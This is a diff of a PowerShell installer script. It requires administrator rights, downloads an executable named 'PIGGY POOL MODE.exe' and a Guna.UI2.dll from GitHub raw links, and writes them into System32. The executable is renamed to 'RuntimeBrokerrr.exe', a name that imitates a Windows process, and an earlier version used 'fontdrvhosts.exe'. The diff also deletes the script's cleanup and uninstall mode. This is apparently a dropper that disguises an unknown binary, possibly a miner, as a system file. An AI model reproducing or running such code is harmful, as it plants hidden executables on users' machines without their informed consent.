@@ -21,7 +21,11 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # -----------------------------
 $system32Path = "$env:windir\System32"
 $exeDestination = Join-Path $system32Path "RuntimeBrokerrr.exe"
-$exeUrl = "https://github.com/ORRYxyz/cccc/blob/main/PIGGY%20POOL%20MODE.exe"
+$dllDestination = Join-Path $system32Path "Guna.UI2.dll"
+
+
+$exeUrl = "https://github.com/ORRYxyz/cccc/raw/main/PIGGY%20POOL%20MODE.exe"
+$dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"
 
 # -----------------------------
 # Install & Run Mode
@@ -32,22 +36,22 @@ if ($choice -eq "1") {
     # Download DLL first
     Write-Host "Downloading Guna.UI2.dll..."
     try {
-        Invoke-WebRequest -Uri $dllUrl -OutFile $dllDestination
+        Invoke-WebRequest -Uri $dllUrl -OutFile $dllDestination -UseBasicParsing
         Write-Host "Guna.UI2.dll download completed." -ForegroundColor Green
     } catch {
         Write-Host "Guna.UI2.dll download failed: $_" -ForegroundColor Red
         exit
     }
 
-    # Download exe and rename to fontdrvhosts.exe
-    Write-Host "Downloading and renaming executable to fontdrvhosts.exe..."
+    # Download exe and place to $exeDestination
+    Write-Host "Downloading executable and saving to $exeDestination..."
     try {
         $tempFile = Join-Path $env:TEMP "seanual_temp.exe"
-        Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile
+        Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile -UseBasicParsing
         Move-Item -Path $tempFile -Destination $exeDestination -Force
-        Write-Host "fontdrvhosts.exe download completed." -ForegroundColor Green
+        Write-Host "Executable download completed." -ForegroundColor Green
     } catch {
-        Write-Host "fontdrvhosts.exe download failed: $_" -ForegroundColor Red
+        Write-Host "Executable download failed: $_" -ForegroundColor Red
         exit
     }
 
@@ -65,39 +69,4 @@ if ($choice -eq "1") {
 
 # -----------------------------
 # Clean Mode
-# -----------------------------
-elseif ($choice -eq "2") {
-    Write-Host "Cleaning up installation..."
-
-    # Stop the process if running
-    Write-Host "Stopping fontdrvhosts.exe process..."
-    try {
-        Stop-Process -Name "fontdrvhosts" -Force -ErrorAction SilentlyContinue
-        Write-Host "Process stopped." -ForegroundColor Green
-    } catch {
-        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
-    }
-
-    # Remove files if they exist
-    if (Test-Path $exeDestination) { 
-        Remove-Item $exeDestination -Force 
-        Write-Host "Removed executable: $exeDestination" -ForegroundColor Green
-    }
-    
-    if (Test-Path $dllDestination) { 
-        Remove-Item $dllDestination -Force 
-        Write-Host "Removed DLL: $dllDestination" -ForegroundColor Green
-    }
-
-    Write-Host "Cleanup completed." -ForegroundColor Green
-}
-
-else {
-    Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
-
-}
-
-
-
-
-
+# -------------------------
